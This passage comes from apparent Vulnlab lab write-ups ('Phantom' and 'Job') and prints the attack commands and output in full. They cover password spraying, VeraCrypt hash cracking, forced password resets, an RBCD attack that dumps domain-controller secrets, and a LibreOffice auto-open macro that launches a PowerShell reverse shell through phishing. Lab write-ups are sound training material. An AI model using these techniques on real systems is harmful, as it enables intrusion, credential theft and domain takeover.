be tech support. A base64 encoded attachment was provided in this email, though it is unintelligible from our perspective on Linux (if we try to decode it with basic tools). I instead opted to copy it to my Windows host and open it through Outlook.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/b.png\"></p>\n<p>It seems that a basic password is provided for new users with this tech support document. This should be the default password for new users that are onboarded, so we can potentially test this against the user list that we currently have.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.103.169 -u full_ul.txt -p &#x27;(EMAIL PASSWORD)&#x27; --continue-on-success</span><br><span class=\"line\">......</span><br><span class=\"line\">LDAP        10.10.103.169   389    DC               [+] phantom.vl\\ibryant:(EMAIL PASSWORD)</span><br></pre></td></tr></table></figure>\n\n<p>You’ll receive a few false positives when testing these credentials against the domain, as denoted by the unsuccessful bind message under each false positive.</p>\n<p>That being said, a user&#x2F;password match did seem to return within a successful bind for <code>ibryant</code>. Since they are successfully able to authenticate to LDAP, we can dump the domain using Bloodhound and the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a>. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;phantom.vl&#x27; -u &#x27;ibryant&#x27; -p &#x27;(IBRYANT PASSWORD)&#x27; -c all -ns 10.10.103.169 --zip</span><br><span class=\"line\">INFO: Compressing output into 20240713234621_bloodhound.zip</span><br></pre></td></tr></table></figure>\n\n<p>After booting up Bloodhound and checking out our user’s node, it does not seem that we have any outbound object controls&#x2F;privileges over any other domain objects. Having the Bloodhound graph is still helpful for us later down the attack path for other users we compromise.</p>\n<p>I was able to find out after some password usage against SMB that we now have access to the <code>Department Share</code> SMB share with <code>ibryant</code>. Let’s see what we can find within this share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.103.169\\\\Departments\\ Share -U &#x27;ibryant&#x27;</span><br><span class=\"line\">Password for [WORKGROUP\\ibryant]:</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sat Jul  6 12:25:31 2024</span><br><span class=\"line\">  ..                                DHS        0  Sun Jul  7 04:39:30 2024</span><br><span class=\"line\">  Finance                             D        0  Sat Jul  6 12:25:11 2024</span><br><span class=\"line\">  HR                                  D        0  Sat Jul  6 12:21:31 2024</span><br><span class=\"line\">  IT                                  D        0  Thu Jul 11 10:59:02 2024</span><br><span class=\"line\"></span><br><span class=\"line\">6127103 blocks of size 4096. 1178542 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>I did some spidering on this share, and it seems that there is notably a bit of information for the next exploit within the <code>IT</code> directory.</p>\n<h1 id=\"Cracking-VeraCrypt-Volume-Passwords\"><a href=\"#Cracking-VeraCrypt-Volume-Passwords\" class=\"headerlink\" title=\"Cracking VeraCrypt Volume Passwords\"></a>Cracking VeraCrypt Volume Passwords</h1><p>Within this directory, exists a <code>veracrypt</code> Linux installation package along with a few other programs such as <code>TeamViewer</code> and <code>mRemoteNG</code>.</p>\n<p>Within the <code>Backups</code> directory in this folder, seems to be a file with a <code>.hc</code> extension.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\IT\\&gt; cd Backup</span><br><span class=\"line\">smb: \\IT\\Backup\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sat Jul  6 14:04:34 2024</span><br><span class=\"line\">  ..                                  D        0  Thu Jul 11 10:59:02 2024</span><br><span class=\"line\">  IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 14:04:14 2024</span><br><span class=\"line\"></span><br><span class=\"line\">6127103 blocks of size 4096. 1178408 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>Doing some research on this file led me to interpret that this was an encrypted VeraCrypt volume. VeraCrypt in particular is an open disk encryption application that allows for further protection against files and filesystems, locking them behind encryption algorithms.</p>\n<p>The encryption volume that we seem to have on our hands is a volume&#x2F;filesystem related to an IT backup that the IT team (presumably the team the <code>ibryant</code> is being onboarded to) had previously conducted on <code>July 6</code>.</p>\n<p>I set up <code>veracrypt</code> locally on my Kali machine, you could use the installation package that is within the <code>IT</code> directory or install it from the <a href=\"https://veracrypt.eu/en/Downloads.html\">VeraCrypt</a> website.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/c.png\"></p>\n<p>It seems that we’ll need to use a password or keyfile in order to mount this volume. This is one of the main security features that VeraCrypt offers, so we’ll need to find the password to mount it.</p>\n<p>I did a bit of enumeration on the file share, and it doesn’t seem that anything points towards a password that we could use. Password reusage from passwords such as <code>ibryant</code>‘s password also does not seem to result in anything success. At this point - we could potentially brute force for this password, though we don’t have much to build off of in terms of a password policy that these users might set this to. </p>\n<p>Luckily enough, <code>hashcat</code> offers a numerous amount of VeraCrypt hash cracking algorithms. The default encryption algorithm that VeraCrypt can use is <code>AES/SHA512 (legacy)</code>, which has a hash ID of 13721.</p>\n<p>Next, we’ll need to define a rule for our password brute force. If we think about it from a real-world sense, there are common password policies that involve simple password mutation, such as date-of-birth or the users last name. Passwords also generally involve a few special characters and a capital letter.</p>\n<p>The password mutation I decided to try in particular consisted of the following password attributes. The Wiki hint also solidifies this factor on the <a href=\"https://wiki.vulnlab.com/guidance/medium/phantom\">machine’s page</a>.</p>\n<ul>\n<li>Capital letter, preferably the first alphanumeric character in the password.</li>\n<li>Company&#x2F;Machine name.</li>\n<li>Year, can revolve of any permutation from 2022-2024 (based on the current year).</li>\n<li>Special character (any)</li>\n</ul>\n<p>I started by creating a wordlist based on common strings from the machine name, ending up with a result such as this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat phantom.txt             </span><br><span class=\"line\">phantom</span><br><span class=\"line\">Phantom</span><br><span class=\"line\">PHANTOM</span><br><span class=\"line\">PHANT0M</span><br><span class=\"line\">phant0m</span><br><span class=\"line\">phantom.vl</span><br><span class=\"line\">PHANTOM.VL</span><br><span class=\"line\">phant0m.vl</span><br><span class=\"line\">PHANT0M.vl</span><br><span class=\"line\">Ph4nt0m</span><br><span class=\"line\">PH4NT0M</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have our hash ID and our wordlist, the last thing that we’ll need is our hashcat rule. I created a simple rule file that hashcat could parse based off of the expressions that it uses. In a rule file, you can generally state the ruleset appended to the end of each string in your wordlist like this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat phantom.rule </span><br><span class=\"line\">$2 $0 $2 $3 $$</span><br><span class=\"line\">$2 $0 $2 $3 $&amp;</span><br><span class=\"line\">$2 $0 $2 $3 $@</span><br><span class=\"line\">$2 $0 $2 $3 $!</span><br><span class=\"line\">$2 $0 $2 $3 $#</span><br><span class=\"line\">$2 $0 $2 $3 $%</span><br><span class=\"line\">$2 $0 $2 $3 $^</span><br><span class=\"line\">$2 $0 $2 $3 $*</span><br><span class=\"line\">$2 $0 $2 $3 $(</span><br><span class=\"line\">$2 $0 $2 $3 $)</span><br><span class=\"line\">$2 $0 $2 $3 $-</span><br><span class=\"line\">$2 $0 $2 $3 $_</span><br><span class=\"line\">$2 $0 $2 $3 $=</span><br><span class=\"line\">$2 $0 $2 $3 $+</span><br></pre></td></tr></table></figure>\n\n<p>This essentially states that each string will be appended by the year <code>2023</code> along with each special character on a regular keyboard (or at least most of them).</p>\n<p>Now that we have all of the components needed, we can proceed with our hash cracking. By default, the first 512 bytes of an encrypted VeraCrypt volume contain the password of the volume, however <code>hashcat</code> can parse this out if we give it the raw volume.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 13721 IT_BACKUP_201123.hc phantom.txt -r phantom.rule </span><br><span class=\"line\">hashcat (v6.2.6) starting</span><br><span class=\"line\">......</span><br><span class=\"line\">IT_BACKUP_201123.hc:[...snip...]                         </span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 13721 (VeraCrypt SHA512 + XTS 512 bit (legacy))</span><br><span class=\"line\">Hash.Target......: IT_BACKUP_201123.hc</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to crack the hash for the volume and can now mount the volume. The method that we used can be seen in real-world situations, so it was nice to test out and can really get you thinking on how a person might think to create a password.</p>\n<p>Now that we have the password, we should be able to mount the volume to a location on our local system to see its contents.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/d.png\"></p>\n<p>As you can see, it was saved under <code>/media/veracrypt1</code>.</p>\n<h1 id=\"Credential-Hunting\"><a href=\"#Credential-Hunting\" class=\"headerlink\" title=\"Credential Hunting\"></a>Credential Hunting</h1><p>Given that <code>veracrypt</code> only allocates a relatively small amount of storage to this mount (you may see a few full storage errors), we can simply copy all of the contents of this mount to a directory within our <code>/</code> filesystem. You can do so easily with <code>sudo cp -r * (DESIRED FILEPATH)</code>.</p>\n<p>Doing some enumeration on the volume brought me to an interesting file that contained a password for a user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vpn &#123;</span><br><span class=\"line\">    sstp &#123;</span><br><span class=\"line\">        authentication &#123;</span><br><span class=\"line\">            local-users &#123;</span><br><span class=\"line\">                username lstanley &#123;</span><br><span class=\"line\">                    password &quot;[...snip...]&quot;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n\n<p>If you unzip and decompress all of the archives within the volume you mounted, this will be within <code>/config/archive/config.boot</code>. It seems that after a bit of credential hunting, we were able to retrieve the password to the <code>lstanley</code> user.</p>\n<p>While we would assume this would be for their user, I decided to run a <code>crackmapexec</code> scan against the full user list that we have just in case it belongs to other users instead of <code>lstanley</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.103.169 -u full_ul.txt -p &#x27;[...snip...]&#x27; --continue-on-success</span><br><span class=\"line\">......</span><br><span class=\"line\">LDAP        10.10.103.169   389    DC               [+] phantom.vl\\svc_sspr:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>It seems that a successful password match was found for <code>svc_sspr</code>.</p>\n<p>I also made sure to run this against WinRM, and it seems that this user is part of the <code>Remote Management Users</code> group.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm 10.10.103.169 -u svc_sspr -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.103.169   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)</span><br><span class=\"line\">HTTP        10.10.103.169   5985   DC               [*] http://10.10.103.169:5985/wsman</span><br><span class=\"line\">WINRM       10.10.103.169   5985   DC               [+] phantom.vl\\svc_sspr:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>This means we should be able to authenticate to WinRM using <code>evil-winrm</code> and read the first flag.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.103.169 -u &#x27;svc_sspr&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\svc_sspr\\Documents&gt; cat ..\\Desktop\\user.txt</span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Domain-Escalation-as-svc-sspr\"><a href=\"#Domain-Escalation-as-svc-sspr\" class=\"headerlink\" title=\"Domain Escalation as svc_sspr\"></a>Domain Escalation as svc_sspr</h1><p>Now that we successfully have access to the machine - we could look around the filesystem to see if there are any pertinent files&#x2F;applications that we could exploit. Below is a list of security checks that I performed to see if the filesystem possessed any important data.</p>\n<ul>\n<li>Cached DPAPI credentials&#x2F;master keys with <code>Seatbelt</code>.</li>\n<li>Internal services using <code>netstat</code>.</li>\n<li>Abnormal running programs with <code>ps</code>.</li>\n<li>Credential Hunting on the filesystem.</li>\n<li>Regular privilege escalation tactics with tools such as <code>PrivescCheck</code> and <code>Winpeas</code>.</li>\n</ul>\n<p>Though nothing seemed to come back with any successful results. I decided to turn my attention back to our Bloodhound graph to see if our user had any privileges over any other domain objects.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/e.png\"></p>\n<p>It seems as though <code>svc_sspr</code> has <code>ForceChangePassword</code> set over three domain users. This attribute essentially allows us to change the password of the domain user to any string of our choosing. This will allow us to take full control over this domain user and exploit any privileges that they have,</p>\n<p>We can easily do so through RPC.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ net rpc password &quot;crose&quot; &quot;Password123@&quot; -U &quot;phantom.vl&quot;/&quot;svc_sspr&quot;%&quot;(SVC_SSPR PASSWORD)&quot; -S &quot;dc.phantom.vl&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This should of theoretically changed the password for the user <code>crose</code>, and we can verify so in LDAP.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.103.169 -u crose -p &#x27;Password123@&#x27;                   </span><br><span class=\"line\">SMB         10.10.103.169   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.103.169   389    DC               [+] phantom.vl\\crose:Password123@</span><br></pre></td></tr></table></figure>\n\n<p>Looks like it works, we now possess the password for this user. They don’t seem to have the ability to authenticate to the filesystem, so our privilege escalation must still be through the domain.</p>\n<p><img src=\"/images/vulnlab/phantom-vl/f.png\"></p>\n<p>It seems that this user, <code>crose</code>, is within the <code>ICT Security</code> domain group. This means that by default, they have <code>AllowedToActOnBehalfOfOtherIdentity</code> privilege over the domain controller, <code>DC.PHANTOM.VL</code>.</p>\n<p>This privilege essentially allows us to act on behalf of the domain controller, and request for service tickets on behalf of that domain computer. This privilege in particular allows us to exploit RBCD (resource-based constrained delegation), which can allow us to compromise the domain controller. We’ve done this exploit in the past on other machines, and it seems as though this is the same type of attack path here.</p>\n<h1 id=\"RBCD-Through-SPN-less-User\"><a href=\"#RBCD-Through-SPN-less-User\" class=\"headerlink\" title=\"RBCD Through SPN-less User\"></a>RBCD Through SPN-less User</h1><p>However, there is one primary issue that we face for this machine. Our domain user has a MAQ of 0, meaning they cannot create domain computers that are needed for exploiting RBCD. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.103.169 -u crose -p &#x27;Password123@&#x27; -M maq</span><br><span class=\"line\">SMB         10.10.103.169   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.103.169   389    DC               [+] phantom.vl\\crose:Password123@ </span><br><span class=\"line\">MAQ         10.10.103.169   389    DC               [*] Getting the MachineAccountQuota</span><br><span class=\"line\">MAQ         10.10.103.169   389    DC               MachineAccountQuota: 0</span><br></pre></td></tr></table></figure>\n\n<p>Furthermore, all of the users that we’ve previously had access to have a MAQ of 0, and there doesn’t seem to be any other users that we can escalate our privileges to. (This is due to the fact that the three users that we can compromise as <code>svc_sspr</code> are the only domain users that seem to have outbound object control rights over another object)</p>\n<p>Normally this would be as far as you’d be able to get, but there is actually something that we can exploit given that we have the <code>AllowedToActOn</code> attribute against the DC.</p>\n<p>Credit goes out to the article found <a href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd\">here</a> and<a href=\"https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html\"> here</a> discovered by <a href=\"https://x.com/tiraniddo\">James Forshaw</a>. There is actually a method that we can use to exploit RBCD, though it involves finding our current users ticket session key along with changing their current password to that key.</p>\n<p>At a low-level, if we are able to obtain the ticket session key and change that key to be the password hash of our controlled user, we can utilize User-2-User authentication to trick the DC into delegating a service ticket to us. We can combine both U2U and S4U2Proxy to obtain this ticket, and then use it to dump the LSA secrets of the domain controller. This is due to how the KDC interprets ticket session keys that are passed in as NT hashes for a user, allowing them to be treated as computer objects in a sense.</p>\n<p>So to start, we’ll get the current TGT of the user in order to discover the ticket session key.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-getTGT -hashes :$(pypykatz crypto nt &#x27;Password123@&#x27;) phantom.vl/crose </span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Saving ticket in crose.ccache</span><br></pre></td></tr></table></figure>\n\n<p>We can then use <a href=\"https://github.com/fortra/impacket/blob/master/examples/describeTicket.py\">describeTicket.py</a> to obtain the ticket session key based on the service ticket for this user. (Note that the ticket session key will be different for your instance of this machine)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 describeTicket.py crose.ccache | grep &#x27;Ticket Session Key&#x27;</span><br><span class=\"line\">[*] Ticket Session Key            : 4abd87ab347a96df9a497689a79bfd5c</span><br></pre></td></tr></table></figure>\n\n<p>Now let’s change the user’s password once more to match the hash of the ticket session key that we just received.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-smbpasswd -newhashes :4abd87ab347a96df9a497689a79bfd5c phantom.vl/crose:&#x27;Password123@&#x27;@dc.phantom.vl</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">  Warning: This functionality will be deprecated in the next Impacket version  </span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">[*] NTLM hashes were changed successfully.</span><br></pre></td></tr></table></figure>\n\n<p>Now that the NTLM hash was set with the same value of our ticket session key, we should be able to use RBCD as intended.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-rbcd -delegate-from &#x27;crose&#x27; -delegate-to &#x27;DC$&#x27; -dc-ip 10.10.103.169 -action &#x27;write&#x27; &#x27;phantom.vl&#x27;/&#x27;crose&#x27; -hashes :4abd87ab347a96df9a497689a79bfd5c</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class=\"line\">[*] Delegation rights modified successfully!</span><br><span class=\"line\">[*] crose can now impersonate users on DC$ via S4U2Proxy</span><br><span class=\"line\">[*] Accounts allowed to act on behalf of other identity:</span><br><span class=\"line\">[*]     crose        (S-1-5-21-4029599044-1972224926-2225194048-1126)</span><br></pre></td></tr></table></figure>\n\n<p>Now that the account is able to delegate on behalf of the DC, we can request a service ticket as we normally would with our controlled user. The only difference here is that we’ll use the <code>-u2u</code> option so that the KDC interprets our login attempt as a domain user authentication attempt. We’ll also impersonate the Administrator account so that we can dump the secrets of the domain controller.</p>\n<p>Make sure to set your Kerberos global authentication variable to the <code>crose</code> ticket that we produced earlier.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=crose.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-getST -u2u -impersonate Administrator -spn &#x27;cifs/dc.phantom.vl&#x27; -k -no-pass phantom.vl/&#x27;crose&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Impersonating Administrator</span><br><span class=\"line\">[*] Requesting S4U2self+U2U</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a service ticket for the Administrator user, we can dump the secrets of the domain controller with <code>impacket-secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-secretsdump -k dc.phantom.vl</span><br><span class=\"line\">......</span><br><span class=\"line\">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>Note that the local SAM hash for the Administrator account will not work if you try to PTH. The extracted Administrator hash from the domain credential dump should have the hash you are looking for.</p>\n<p>As seen from the above, we were able to pull the Administrator NT hash and can now use it to authenticate to the machine through WinRM.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.103.169 -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">Evil-WinRM shell v3.5  </span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cat ..\\Desktop\\root.txt</span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we were able to read the root flag, this means that we have successfully compromised this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was relatively difficult when it came to problem-solving, as you needed to have a grasp of how password creation was conceived in general by regular users in the real-world. Though this may not be a situation you’ll see a lot, it is always something that is good to test for. The AD portion was also really interesting, as prior to this machine I did not know you could exploit RBCD when a user does not have control over a domain computer.</p>\n<p>Big props to ar0x4, this machine was great.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://veracrypt.eu/en/Downloads.html\">https://veracrypt.eu/en/Downloads.html</a><br><a href=\"https://wiki.vulnlab.com/guidance/medium/phantom\">https://wiki.vulnlab.com/guidance/medium/phantom</a><br><a href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd\">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a><br><a href=\"https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html\">https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html</a><br><a href=\"https://x.com/tiraniddo\">https://x.com/tiraniddo</a><br><a href=\"https://github.com/fortra/impacket/blob/master/examples/describeTicket.py\">https://github.com/fortra/impacket/blob/master/examples/describeTicket.py</a></p>\n"},{"title":"Job - Vulnlab","date":"2024-07-14T18:19:34.000Z","keywords":"Vulnlab, Medium, Windows","description":"Job is one of the older machines from Vulnlab that consisted of tactics generally seen on the OSCP. This is great practice for the exam, and involves LibreOffice macros in email servers along with an interesting privilege escalation path. I'll try to avoid using C2's for this machine just to stay in-line with OSCP rules.","cover":"/images/vulnlab/job-vl/job_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nJob is one of the older machines from Vulnlab that consisted of tactics generally seen on the OSCP. This is great practice for the exam, and involves LibreOffice macros in email servers along with an interesting privilege escalation path. I'll try to avoid using C2's for this machine just to stay in-line with OSCP rules.\n\n# Enumeration\n\nSo let's first start with our NMAP scan. Our entry point for this machine is `10.10.105.93`.\n\n```\n└─$ sudo nmap 10.10.105.93\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 12:50 EDT\nNmap scan report for 10.10.105.93\nHost is up (0.11s latency).\nNot shown: 996 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n25/tcp   open  smtp\n80/tcp   open  http\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 18.62 seconds\n```\n\nIt looks to be a Windows machine that is not a DC, so we can assume that it is a workstation. There seems to be an email service along with a website, so we can potentially look to those first for our initial foothold.\n\nJust for a service test, I also ran a test against SMB to see if null authentication was enabled.\n\n```\n└─$ smbclient -L 10.10.105.93 -N         \nsession setup failed: NT_STATUS_ACCESS_DENIED\n```\n\nIt seems that the entry point will most definitely be through either the SMTP server or through the web server. Let's take a look at the website first to see if there are any leads to exploit.\n\n![](/images/vulnlab/job-vl/b.png)\n\nThe website looks to be a job application frontpage calling for developer applications. The message from the front seems to give us a potential email for our attack path, `career@job.local`. Furthermore, the page tells us to send our CV as a LibreOffice document.\n\nThere doesn't seem to be much here aside from this page, I made sure to run a VHOST scan for other subdomains and a directory enumeration scan - though I came back with nothing.\n\nLooking at SMTP, it seems as though the server seems to have open relay enabled.\n\n```\n└─$ telnet 10.10.105.93 25\nTrying 10.10.105.93...\nConnected to 10.10.105.93.\nEscape character is '^]'.\n220 JOB ESMTP\nHELP\n211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n```\n\n# LibreOffice Macro RCE\n\nAt this point, the attack path is relatively clear. Assuming that we have nothing else to exploit on the webpage aside from the email, it seems that SMTP is the main part of the attack path. We have an email that we can send documents to, so the first part of this should be phishing.\n\nGiven what the webpage is telling us, it should only be accepting LibreOffice documents with a `.odt` extension. I'm assuming that the backend (since this is a lab) is going to immediately open our document when we send it to view its contents.\n\nThis phishing portion is an exploit directly targeted at LibreOffice - as you can essentially get RCE directly from a LibreOffice macro. Macros can be used to run shell commands directly upon opening the LibreOffice document, and are one of the (if not, the most) commonly seen vulnerability in LibreOffice.\n\nWe can set up LibreOffice Writer locally to create this macro, to which I used my Windows host to create this. LibreOffice has been difficult to set up on my Kali host in my past experiences, so I decided to opt for my Windows machine for this. You can find the installation page [here](https://www.libreoffice.org/get-help/install-howto/).\n\nOnce everything is installed and ready to go, we should be able to open our LibreOffice Writer editor.\n\n![](/images/vulnlab/job-vl/c.png)\n\nI made a short cover letter that is mostly fake, just to have some fun with this lab. I also saved this as a `.odt` file named `daz_smith_CV.odt`. \n\nThe front text doesn't really matter as to what we put on it, as the main part of this exploit consists within the `Macros` section of LibreOffice.\n\nYou can access this by going to `Tools > Macros > Organize Macros > Macros`. Select on the name of your document and click on `New`. We'll name this macro `AO` for \"AutoOpen\".\n\n![](/images/vulnlab/job-vl/d.png)\n\nThis will spawn a LibreOffice Basic editor with your macro pane on the right side of the application. The foundation for our macro is ready, all we need to do is create a Shell macro so that LibreOffice can execute commands from this macro.\n\nThis forum page details how we can set up shell macros, they are relatively simple and involve wrapping our commands inside a `Shell()` call. We'll also be looking to execute a reverse shell, to which I opted to use a Base64 encoded Powershell reverse shell crafted from [revshells.com](https://www.revshells.com/).\n\n![](/images/vulnlab/job-vl/e.png)\n\nIn order to make this macro execute upon opening the document, we'll need to set the AutoOpen feature to open this document automatically. We can access this (from the LibreOffice Writer window, not the Macro window) in `Tools > Customize`. Select `OpenDocument` from the `Events` list and select the macro that we just created.\n\nFrom here, our document should be ready to exploit. You can test that this works by reopening the document, and a PowerShell pane should be seen briefly as soon as you open it. Since we're on our Windows host and don't have a listener running, this won't do anything - though you'll know that it should be working.\n\nWith that, we'll transfer this back to our Kali system and set up a netcat listener on the port that our PowerShell reverse shell going to call back to. In my case, I'll do `nc -lvnp 9001`.\n\nWe'll now need a way to send this through SMTP, which can be trivial dependent on the tools you have access to. By default, the most up-to-date version of Kali should have the `sendemail` tool installed - which makes emails submitted through SMTP easy to submit. You could also opt to use `swaks`, though I could not seem to get that tool working on my end.\n\n```\n└─$ sendemail -s job.local -f \"daz <daz@daz.daz>\" -t career@job.local -o tls=no -m \"Please see the attached for my cover letter. \\n\\nV/R.,\\n\\nDaZ Smith\" -a daz_smith_CV.odt\n```\n\nI also made sure to set `job.local` to our IP address of `10.10.105.93` just so that it can resolve properly to the workstation. Let's send our email and wait for a result on our listener.\n\nAfter a few seconds, we should get a shell back as `jack.black`.\n\n![](/images/vulnlab/job-vl/f.png)\n\nThe user flag is within the users `Desktop` directory, meaning we have compromised the first half of this machine.\n\n# Privilege Escalation Through Writable Directories\n\nAt this point, given that we are not within an AD environment - I would assume that the next part of privilege escalation would either be credential hunting or internal application exploitation.\n\nThere doesn't seem to be much for the `jack.black` user in their home directory (nor any cached credentials in their home folder), and they do not seem to have any notable privileges on this workstation.\n\n```\nPS C:\\> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State   \n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\nI checked the `C:\\` root directory and it seems that the web server itself is being hosted within the `inetpub` page. I have confirmed that this is the website as the `index.html` page within `wwwroot` seems to be identical to the webpage we visited at the start of this machine.\n\nI did however notice that we have write access to this directory upon uploading a simple `test.txt` file.\n\n```\nPS C:\\inetpub\\wwwroot> echo \"test\" > test.txt\nPS C:\\inetpub\\wwwroot> ls\n\nDirectory: C:\\inetpub\\wwwroot\n\nMode                 LastWriteTime         Length Name                   \n----                 -------------         ------ ----                   \nd-----        11/10/2021   8:52 PM                aspnet_client          \nd-----         11/9/2021   9:24 PM                assets                 \nd-----         11/9/2021   9:24 PM                css                    \nd-----         11/9/2021   9:24 PM                js                     \n-a----        11/10/2021   9:01 PM            298 hello.aspx             \n-a----         11/7/2021   1:05 PM           3261 index.html             \n-a----         7/14/2024   